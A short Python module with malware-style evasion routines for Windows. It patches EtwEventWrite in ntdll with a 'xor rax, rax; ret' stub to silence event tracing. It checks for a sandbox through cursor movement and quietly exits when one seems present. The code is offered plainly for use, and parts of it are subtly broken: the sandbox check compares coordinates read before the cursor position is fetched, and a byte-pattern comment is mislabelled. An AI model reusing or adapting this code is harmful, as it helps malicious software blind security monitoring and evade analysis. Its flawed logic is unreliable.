import ctypes
import platform


def detect_etw_hooks():
    if platform.system() != "Windows":
        return False
    try:
        ntdll = ctypes.windll.kernel32.GetModuleHandleW("ntdll.dll")
        addr = ctypes.windll.kernel32.GetProcAddress(ntdll, b"EtwEventWrite")
        buf = (ctypes.c_ubyte * 6).from_address(addr)
        if list(buf[:2]) != [0x4C, 0x8B]:  # Expected MOV RAX,...
            return True  # Hook likely present
    except BaseException:
        pass
    return False


def unhook_etw():
    if platform.system() != "Windows":
        return
    try:
        ntdll = ctypes.windll.kernel32.LoadLibraryW("ntdll.dll")
        etw = ctypes.windll.kernel32.GetProcAddress(ntdll, b"EtwEventWrite")
        patch = b"\x48\x33\xc0\xc3"  # xor rax, rax; ret
        old = ctypes.c_ulong()
        ctypes.windll.kernel32.VirtualProtect(etw, len(patch), 0x40, ctypes.byref(old))
        ctypes.memmove(etw, patch, len(patch))
    except BaseException:
        pass


def detect_sandbox_io():
    try:
        from ctypes import windll, wintypes

        pt = wintypes.POINT()
        x1, y1 = pt.x, pt.y
        windll.user32.GetCursorPos(ctypes.byref(pt))
        x2, y2 = pt.x, pt.y
        if x1 == x2 and y1 == y2:
            return True  # No movement, likely synthetic input
    except BaseException:
        pass
    return False


def run_advanced_evasion():
    if detect_etw_hooks():
        unhook_etw()
    if detect_sandbox_io():
        exit(0)  # Silent self-terminate if synthetic env
